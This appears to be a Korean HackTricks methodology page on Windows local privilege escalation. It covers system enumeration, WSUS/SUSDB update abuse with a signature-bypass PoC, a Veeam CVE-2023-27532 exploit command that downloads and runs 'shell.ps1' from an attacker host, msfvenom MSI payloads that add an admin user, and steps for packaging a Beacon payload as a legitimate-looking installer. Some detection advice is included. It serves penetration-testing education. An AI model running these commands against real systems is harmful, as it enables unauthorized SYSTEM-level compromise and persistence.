# Windows 로컬 권한 상승

{{#include ../../banners/hacktricks-training.md}}

### **Windows 로컬 권한 상승 벡터를 찾는 데 가장 좋은 도구:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

이 페이지는 여러 기초 가이드의 일반적인 Windows 권한 상승 방법론을 통합합니다.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 실전 열거 절차에는 커뮤니티 워크숍과 체크리스트의 내용도 반영되어 있습니다.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> 과거 공격 자료에는 Windows 권한 상승에 관한 DerbyCon 프레젠테이션이 포함되어 있습니다.<sup>[[5]](#references)</sup>

## Windows 기본 이론

### Access Tokens

**Windows access token이 무엇인지 모른다면, 계속하기 전에 다음 페이지를 읽어 보세요:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs에 대한 자세한 내용은 다음 페이지를 확인하세요:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows의 integrity level이 무엇인지 모른다면, 계속하기 전에 다음 페이지를 읽어 보세요:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows 보안 제어

Windows에는 **시스템 열거**, 실행 파일 실행을 **막거나**, 심지어 **활동을 탐지**할 수 있는 여러 기능이 있습니다. 권한 상승 열거를 시작하기 전에 다음 **페이지**를 **읽고** 모든 **방어** **메커니즘**을 **열거**해야 합니다:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

물리적 접근 권한이 있으면 오프라인 UEFI NVRAM 편집을 부팅 전 DMA 및 Windows `SYSTEM` 메모리 패치 체인으로 이어갈 수도 있습니다:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess 무음 상승

`RAiLaunchAdminProcess`를 통해 실행한 UIAccess 프로세스는 AppInfo의 secure-path 검사를 우회하면 프롬프트 없이 High IL에 도달하는 데 악용될 수 있습니다. 전용 UIAccess/Admin Protection 우회 절차는 여기에서 확인하세요:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop 접근성 레지스트리 전파는 임의의 SYSTEM 레지스트리 쓰기(RegPwn)에 악용될 수 있습니다:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

최근 Windows 빌드에는 권한이 있는 로컬 NTLM 인증을 재사용된 SMB TCP 연결을 통해 반사시키는 **임의 포트 SMB** LPE 경로도 도입되었습니다:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## 시스템 정보

### 버전 정보 열거

Windows 버전에 알려진 취약점이 있는지 확인하세요(적용된 패치도 확인하세요).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### 버전 익스플로잇

이 [사이트](https://msrc.microsoft.com/update-guide/vulnerability)는 Microsoft 보안 취약점에 대한 자세한 정보를 검색할 때 유용합니다. 이 데이터베이스에는 4,700개가 넘는 보안 취약점이 등록되어 있으며, Windows 환경이 **광범위한 공격 표면**을 제공한다는 점을 보여 줍니다.

**시스템에서**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OS 빌드, 설치된 업데이트 및 관련 가능성이 있는 권고 사항을 조사합니다. 결과를 적용 가능한 것으로 간주하기 전에 정확한 제품과 대체 업데이트를 확인하세요.

버전에 따라 달라지는 로컬 익스플로잇을 확인할 때는 OS 아키텍처뿐 아니라 **실행 중인 프로세스의 아키텍처**도 확인하세요. 64비트 Windows에서 32비트 프로세스는 [WOW64 파일 시스템 리디렉션](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector)의 영향을 받습니다. `%windir%\System32`는 일반적으로 32비트 시스템 디렉터리로 연결되는 반면, `%windir%\Sysnative`를 사용하면 해당 프로세스가 네이티브 시스템 디렉터리에 접근할 수 있습니다. 이 별칭은 64비트 프로세스에서 사용할 수 없습니다. OS 빌드 정보나 누락된 KB 업데이트 후보만으로는 익스플로잇 가능성이 입증되지 않습니다. 정확한 문제에 대한 [Microsoft 보안 공지](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)를 참고해 실행 중인 빌드, 설치되었거나 대체된 업데이트, 프로세스 아키텍처, 익스플로잇 전제 조건을 비교하세요.

**시스템 정보를 사용해 로컬에서**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**익스플로잇 GitHub 저장소:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 환경

환경 변수에 저장된 credential/Juicy 정보가 있나요?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell 기록

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript 파일

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)에서 이 기능을 켜는 방법을 확인할 수 있습니다.

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts`는 예시일 뿐입니다. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription)는 일반적으로 각 사용자의 Documents 폴더에 기록하지만, `OutputDirectory` 설정이나 `Start-Transcript -OutputDirectory`를 사용하면 공유 폴더나 숨겨진 폴더로 파일을 리디렉션할 수 있습니다. transcript를 검토하기 전에 실제 출력 경로와 파일 ACL을 확인하세요. transcript에는 자격 증명을 포함한 명령 인수와 출력이 들어 있을 수 있습니다. 읽을 수 있는 transcript는 그 내용에 사용 가능한 상위 권한 ID가 드러나 있고, 해당 ID로 관련 컨텍스트에서 로그온할 수 있을 때만 단서가 됩니다.

### PowerShell Module Logging

PowerShell pipeline 실행 세부 정보에는 실행된 명령, 명령 호출, 스크립트의 일부가 기록됩니다. 하지만 실행 세부 정보와 출력 결과가 모두 캡처되지는 않을 수 있습니다.

이 기능을 활성화하려면 설명서의 "Transcript files" 섹션에 나온 지침을 따르고, **"Powershell Transcription"** 대신 **"Module Logging"**을 선택하세요.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowerShell 로그의 마지막 15개 이벤트를 보려면 다음을 실행할 수 있습니다:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

스크립트 실행의 전체 활동과 전체 콘텐츠 기록이 캡처되어, 코드 블록이 실행될 때마다 문서화됩니다. 이 프로세스는 각 활동에 대한 포괄적인 감사 추적을 보존하므로 포렌식 분석과 악성 행위 조사에 유용합니다. 실행 시점에 모든 활동을 문서화하여 프로세스에 대한 상세한 정보를 제공합니다.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block의 로깅 이벤트는 Windows Event Viewer에서 다음 경로로 확인할 수 있습니다: **응용 프로그램 및 서비스 로그 > Microsoft > Windows > PowerShell > Operational**.\
마지막 20개의 이벤트를 보려면 다음을 사용하세요:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### 인터넷 설정

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### 드라이브

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP WSUS endpoint는 업데이트 메타데이터 가로채기 여부를 조사할 단서입니다. 실제 악용 가능성은 클라이언트가 해당 WSUS 서버를 사용하는지, 공격자가 트래픽을 가로채거나 제어할 수 있는지, 그리고 클라이언트의 업데이트 신뢰 및 설치 정책에 따라 달라집니다. URL만으로는 코드 실행이 가능하다고 단정할 수 없습니다. [Microsoft recommends TLS for WSUS metadata](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

먼저 cmd에서 다음 명령을 실행해 네트워크가 SSL을 사용하지 않는 WSUS 업데이트를 사용하는지 확인합니다:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

또는 PowerShell에서 다음을 실행합니다:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

다음과 같은 응답을 받으면:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

그리고 `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` 또는 `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"`의 값이 `1`인지 확인하세요.

`UseWUServer`가 `1`이면 Windows Update는 구성된 인트라넷 서비스를 사용합니다. 이는 HTTP interception 경로의 전제 조건을 확인해 주지만, interception, 악성 업데이트 수락 또는 높은 권한으로 설치가 가능한지는 증명하지 않습니다. 값이 `0`이면 이 정책에서 특정하게 구성된 WSUS endpoint를 선택하지 않습니다.

이 취약점을 악용하려면 [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) 같은 도구를 사용할 수 있습니다. 이 도구들은 SSL을 사용하지 않는 WSUS 트래픽에 'fake' 업데이트를 주입하는 MiTM용 무기화된 exploit 스크립트입니다.

여기에서 연구 내용을 확인하세요:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**전체 보고서는 여기에서 확인하세요**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
기본적으로, 이 버그가 악용하는 취약점은 다음과 같습니다.

> 로컬 사용자 proxy를 수정할 수 있고 Windows Updates가 Internet Explorer 설정에 구성된 proxy를 사용한다면, [PyWSUS](https://github.com/GoSecure/pywsus)를 로컬에서 실행해 자체 트래픽을 가로채고 자산에서 높은 권한의 사용자로 코드를 실행할 수 있습니다.
>
> 또한 WSUS 서비스는 현재 사용자의 설정을 사용하므로 해당 사용자의 certificate store도 사용합니다. WSUS hostname에 대한 self-signed certificate를 생성해 현재 사용자의 certificate store에 추가하면 HTTP와 HTTPS WSUS 트래픽을 모두 가로챌 수 있습니다. WSUS는 certificate에 대해 trust-on-first-use 방식의 검증을 구현하는 HSTS 유사 메커니즘을 사용하지 않습니다. 제시된 certificate가 사용자가 신뢰하고 올바른 hostname을 포함하면 서비스에서 수락됩니다.

[**WSUSpicious**](https://github.com/GoSecure/wsuspicious) 도구를 사용해 이 취약점을 악용할 수 있습니다(공개된 후).

### WSUS 관리자 제어 업데이트

현재 identity가 WSUS 서버에서 업데이트를 **게시하고 승인**할 수 있는 경우에는 별도의 경로가 있습니다. 서버의 `WSUS Administrators` 그룹에 대한 유효 멤버십과 위임된 WSUS 권한을 확인한 다음, 승인된 업데이트를 받을 클라이언트 컴퓨터 그룹을 식별하세요. [Microsoft는 업데이트를 승인하려면 WSUS Administrator 권한이 필요하다고 명시하며](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), [게시 신뢰 관계에 대해서도 설명합니다](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29). 클라이언트는 로컬 게시 콘텐츠에 사용된 서명 인증서를 신뢰해야 합니다. 이를 권한 상승 경로로 간주하기 전에 후보 업데이트가 서명되고 수락되며, 대상에 적용 가능하고, 더 높은 권한의 컨텍스트에서 설치되는지 확인하세요. HTTP `WUServer` 값이나 그룹 이름만으로는 이러한 조건이 충족된다고 볼 수 없습니다.

### SUSDB custom-update 악용: `.txt`/`.esd`를 통한 서명되지 않은 payload

이는 HTTP WSUS 연결을 가로채는 것과는 다른 신뢰 경계 취약점입니다. 전제 조건은 custom update를 게시하고 승인할 수 있도록 **WSUS 데이터베이스(`SUSDB`) 저장 프로시저에 충분히 접근하는 것**입니다. 실용적인 진입 경로 중 하나는 upstream WSUS 컴퓨터 계정을 별도의 `SUSDB` 호스팅 MSSQL 서버로 relay하는 것입니다. 정확한 전제 조건은 배포 환경에 따라 다르므로 SQL 관리자 권한이 있다고 가정하지 말고 먼저 `EXECUTE` 권한을 열거하세요.<sup>[[38]](#references)[[39]](#references)</sup>

HTTP/8530에서 LDAP, SMB 또는 AD CS로 WSUS 클라이언트 인증을 relay하는 별도 공격 경로는 [WSUS HTTP를 NTLM relay에 악용하기](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8)를 참조하세요.

#### 업데이트 빌드, 대상 지정 및 승인

custom-update workflow는 제한된 게시 API로 정식 WSUS 프로시저를 사용합니다. 중요한 상태 전이는 다음과 같습니다.<sup>[[38]](#references)</sup>

| 단계 | 관련 저장 프로시저 |
| --- | --- |
| 업데이트 메타데이터 가져오기 | `spImportUpdate` |
| prerequisite, localized 및 extended XML fragment 저장 | `spSaveXMLFragment` |
| 콘텐츠 digest를 공격자가 제어하는 URL과 연결 | `spSetBatchURL` |
| 컴퓨터 그룹 열거/생성 및 클라이언트 추가 | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| 해당 그룹에 대한 설치 승인 | `@actionID = 0` 및 `@isAssigned = 1`을 지정한 `spDeployUpdate` |

파일 이름, digest, 크기 및 `CommandLineInstallation` handler는 가져온 메타데이터/fragment 전체에서 일치해야 합니다. 콘텐츠 URL과 대상 그룹을 지정한 후의 최종 승인은 다음과 비슷합니다. 예시 GUID를 재사용하지 말고 새로운 업데이트, 그룹 및 배포 식별자를 사용하세요.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### 확장자 기반 signature bypass

WSUS는 일반적으로 서명되지 않은 임의의 실행 파일 콘텐츠를 거부합니다. 하지만 `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`의 .NET `VerifyFile` 경로에서는 전달된 파일 이름이 `.txt` 또는 `.esd`로 끝나면 인증서 확인 플래그를 false로 설정합니다. 이때 해당 바이트가 텍스트이거나 정상적인 ESD 이미지인지 먼저 확인하지 않은 채 `CheckCertificateSignature` 검사를 건너뜁니다. 따라서 변경하지 않은 PE 파일의 이름을 예를 들어 `payload.exe.txt`로 지정하면 콘텐츠 검증을 통과한 뒤 업데이트의 명령줄 설치 핸들러에 의해 실행될 수 있습니다. 이는 서명 위조가 아니라 정책/유형 혼동 버그입니다.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS 호환 스테이징 및 자동화

`spDeployUpdate`를 호출하면 WSUS가 등록된 콘텐츠를 가져옵니다. 원본은 BITS의 HTTP 요구 사항을 충족해야 합니다. URL에 접속할 수 있는 것만으로는 충분하지 않습니다. 전송 과정에서 초기 `HEAD`/`GET` 흐름과 바이트 범위 요청을 사용하기 때문입니다. Range를 지원하지 않는 서버는 BITS에 Range 프로토콜 헤더가 필요하다는 내용의 WSUS 동기화 `EventId=364`를 발생시킵니다.<sup>[[39]](#references)</sup>

연구용 PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)는 가져오기/조각/URL/그룹/배포 체인에 필요한 SQL을 생성하고, 해당 SQL을 실행하기 위한 수정된 MSSQL 클라이언트를 포함하며, 콘텐츠 스테이징용 `BitsWebServer.py`도 제공합니다. 승인된 실습 환경에서 사용하는 최소 명령은 다음과 같습니다.<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### 비대화형 실행 및 재시도 지속성

클라이언트 측 상호작용은 정책에 따라 달라집니다. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`에서 옵션 `4 - Auto download and schedule install`을 선택하면, 승인된 업데이트가 사용자가 직접 선택하지 않아도 구성된 일정에 따라 다운로드 및 설치됩니다. 테스트에서 업데이트가 실패/미완료 상태로 남은 payload는 callback 프로세스가 종료된 직후 다시 제공되었으므로, 재시도 동작이 반복적인 실행 지속성으로 이어질 수 있습니다. 클라이언트에 업데이트 실패 상태가 표시되므로 눈에 띕니다.<sup>[[39]](#references)</sup>

#### 탐지 및 하드닝 대응 지점

이 공격 체인에서 유용한 서버 및 클라이언트 측 대응 지점은 다음과 같습니다.<sup>[[39]](#references)</sup>

- `SUSDB`에서 `spCreateTargetGroup`, `spSetBatchURL`, `spDeployUpdate` 실행을 감사하고, 새 타깃팅 그룹, 외부 콘텐츠 출처, `.txt`/`.esd` 업데이트 payload, 예상치 못한 주체(특히 컴퓨터 계정이 아닌 계정)가 수행한 배포를 조사합니다.
- `C:\Program Files\Update Services\LogFiles`에서 `ContentSyncAgent`, `FileVerified`, 철자가 틀린 `FileVerficationFailed`, `EventId=364`를 검토하고, 접미사를 신뢰하지 말고 payload 확장자와 콘텐츠의 매직 바이트를 기준으로 검증 내용을 대조합니다.
- Windows Update 설치가 반복적으로 실패/재시도되는 경우와, `.txt` 또는 `.esd` 이름을 가진 콘텐츠에서 발생하는 PE 실행이나 예상치 못한 자식 프로세스/네트워크 활동을 탐지합니다.
- 지원되는 경우 데이터베이스 서비스에 Extended Protection for Authentication을 적용하고, 데이터베이스 네트워크 접근을 WSUS 서버 및 권한이 있는 관리 시스템으로 제한합니다. 사용자 지정 업데이트 프로시저의 `EXECUTE` 권한을 최소화하고 감사합니다.

## 서드파티 자동 업데이트 프로그램 및 에이전트 IPC (local privesc)

많은 엔터프라이즈 에이전트는 localhost IPC 인터페이스와 권한이 높은 업데이트 채널을 제공합니다. 등록 요청을 공격자 서버로 유도할 수 있고 업데이트 프로그램이 악성 root CA 또는 취약한 서명자 검증을 신뢰한다면, 로컬 사용자가 악성 MSI를 전달하여 SYSTEM 서비스가 설치하게 할 수 있습니다. 일반화된 기법(Netskope stAgentSvc 공격 체인 – CVE-2025-0309 기반)은 다음을 참조하세요:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401을 통한 SYSTEM 권한)

Veeam Backup & Replication 및 Cloud Connect는 기본적으로 **TCP/9401**에서 핵심 백업 서비스를 사용합니다. [Veeam의 권고문](https://www.veeam.com/kb4424)은 백업 네트워크 경계 내부에서 암호화된 구성 데이터베이스 자격 증명이 인증 없이 노출되는 취약점을 설명하며, 별도의 공개 PoC는 **NT AUTHORITY\SYSTEM** 권한으로 명령을 실행하는 경로를 보여줍니다.<sup>[[12]](#references)</sup> 서비스가 localhost 외부 주소에도 바인딩될 수 있으므로 실제 주소와 PID를 확인하세요.

- **정찰**: TCP/9401이 `Veeam.Backup.Service.exe`에 속하는지 확인한 다음, 설치된 제품과 패치 메타데이터를 살펴봅니다. `netstat -ano | findstr 9401` 및 `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`은 단서일 뿐, 완전한 패치 확인 방법은 아닙니다.
- **수정 버전 하한**: Veeam은 **11a build 11.0.1.1261 P20230227** 및 **12 build 12.0.0.1420 P20230223**을 최초 수정 릴리스로 명시합니다. 이전 릴리스는 취약합니다. 네 부분으로 된 파일 버전만으로는 같은 빌드 번호의 패치되지 않은 기본 빌드와 이후 패치를 구분할 수 없습니다. 경계 빌드가 수정되었다고 판단하기 전에 [벤더 빌드 이력](https://www.veeam.com/kb2680)에서 패치 식별자를 확인하세요.
- **익스플로잇**: `VeeamHax.exe`와 같은 PoC 및 필요한 Veeam DLL을 동일한 디렉터리에 둔 다음, 로컬 소켓을 통해 SYSTEM payload를 트리거합니다:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

인용된 PoC는 추가 전제 조건이 충족되면 SYSTEM으로 명령을 실행할 수 있음을 보여줍니다. 공급업체의 권고문은 자격 증명 노출 문제를 설명합니다.
## KrbRelayUp

적절한 COM 서버가 인증하고 릴레이된 주체가 대상 객체에 대한 권한을 보유하면, 로컬 Kerberos relay를 통해 낮은 권한의 로그온에서 권한이 있는 디렉터리 쓰기로 이어질 수 있습니다. [KrbRelay 문서](https://github.com/cube0x0/KrbRelay)에는 RBCD 및 `msDS-KeyCredentialLink`(shadow-credential) LDAP 쓰기가 모두 나와 있으며, KrbRelayUp은 이 경로 중 일부를 자동화합니다. RBCD 체인에는 해당 위임 및 대상 객체에 대한 권한이 필요하고, shadow-credential 체인에는 key-credential 쓰기 권한과 인증서 인증 경로를 지원하는 KDC가 필요합니다. 어느 경로도 도메인 멤버십만으로 성립하지 않습니다.

실제 DC의 [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) 및 [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) 정책, 릴레이된 ID의 객체 ACL, 선택한 COM 클래스의 인증 및 가장 수준을 확인하세요. 호출자의 로그온 유형과 자격 증명 컨텍스트도 중요합니다. WinRM 세션은 대화형 로그온이나 새 자격 증명 로그온과 다르게 동작할 수 있습니다. 방화벽/OXID 라우팅 및 설치된 업데이트도 결과에 영향을 줄 수 있습니다. 허용적인 정책이나 일치하는 ACL은 검토 대상으로만 간주하세요. 수동 열거 과정에서 COM coercion, relay 인증 또는 디렉터리 쓰기를 유발해서는 안 됩니다. 머신 계정의 shadow credential은 머신 티켓으로 이어질 수 있으며, 해당 계정에 필요한 디렉터리 복제 권한이 있는 경우에만 별도의 DCSync 경로로 이어질 수 있습니다.

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)에서 **exploit을 찾으세요.**

공격 흐름에 대한 자세한 내용은 [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>를 확인하세요.

## AlwaysInstallElevated

이 레지스트리 항목 2개가 **활성화**되어 있으면(값이 **0x1**), 모든 권한 수준의 사용자가 `*.msi` 파일을 NT AUTHORITY\\**SYSTEM** 권한으로 **설치**(실행)할 수 있습니다.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Meterpreter 세션이 있다면 **`exploit/windows/local/always_install_elevated`** 모듈을 사용해 이 기법을 자동화할 수 있습니다.

### PowerUP

power-up의 `Write-UserAddMSI` 명령을 사용해 현재 디렉터리에 권한을 상승시키기 위한 Windows MSI 바이너리를 생성합니다. 이 스크립트는 사용자/그룹 추가를 요청하는 사전 컴파일된 MSI 설치 프로그램을 출력합니다(따라서 GIU 액세스가 필요합니다):

```
Write-UserAddMSI
```

생성한 바이너리를 실행하여 권한을 상승시키기만 하면 됩니다.

### MSI Wrapper

이 도구를 사용하여 MSI wrapper를 만드는 방법은 이 튜토리얼을 참고하세요. **명령줄**을 **실행**하기만 **원하는** 경우 "**.bat**" 파일을 래핑할 수 있습니다.


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX로 MSI 만들기


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio로 MSI 만들기

- Cobalt Strike 또는 Metasploit으로 새 **Windows EXE TCP payload**를 생성하고 `C:\privesc\beacon.exe`에 저장합니다.
- **Visual Studio**를 열고 **Create a new project**를 선택한 다음 검색 상자에 "installer"를 입력합니다. **Setup Wizard** 프로젝트를 선택하고 **Next**를 클릭합니다.
- 프로젝트 이름(예: **AlwaysPrivesc**)을 지정하고 위치로 **`C:\privesc`**를 사용합니다. **place solution and project in the same directory**를 선택한 후 **Create**를 클릭합니다.
- 3/4단계(포함할 파일 선택)에 도달할 때까지 **Next**를 계속 클릭합니다. **Add**를 클릭하고 방금 생성한 Beacon payload를 선택합니다. 그런 다음 **Finish**를 클릭합니다.
- **Solution Explorer**에서 **AlwaysPrivesc** 프로젝트를 선택하고 **Properties**에서 **TargetPlatform**을 **x86**에서 **x64**로 변경합니다.
  - **Author**, **Manufacturer** 등 다른 속성도 변경하여 설치된 앱을 더 정상적인 것처럼 보이게 할 수 있습니다.
- 프로젝트를 마우스 오른쪽 버튼으로 클릭하고 **View > Custom Actions**를 선택합니다.
- **Install**을 마우스 오른쪽 버튼으로 클릭하고 **Add Custom Action**을 선택합니다.
- **Application Folder**를 두 번 클릭하고 **beacon.exe** 파일을 선택한 다음 **OK**를 클릭합니다. 이렇게 하면 설치 프로그램을 실행하는 즉시 Beacon payload가 실행됩니다.
- **Custom Action Properties**에서 **Run64Bit**을 **True**로 변경합니다.
- 마지막으로 **빌드합니다**.
  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` 경고가 표시되면 플랫폼이 x64로 설정되어 있는지 확인합니다.

### MSI 설치

악성 `.msi` 파일의 **설치**를 **백그라운드에서** 실행하려면:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

이 취약점을 악용하려면 다음을 사용할 수 있습니다: _exploit/windows/local/always_install_elevated_

## 백신 및 탐지기

### 감사 설정

이 설정은 무엇을 **기록할지** 결정하므로 주의해야 합니다.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding의 경우 로그가 어디로 전송되는지 알아두는 것이 중요합니다.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

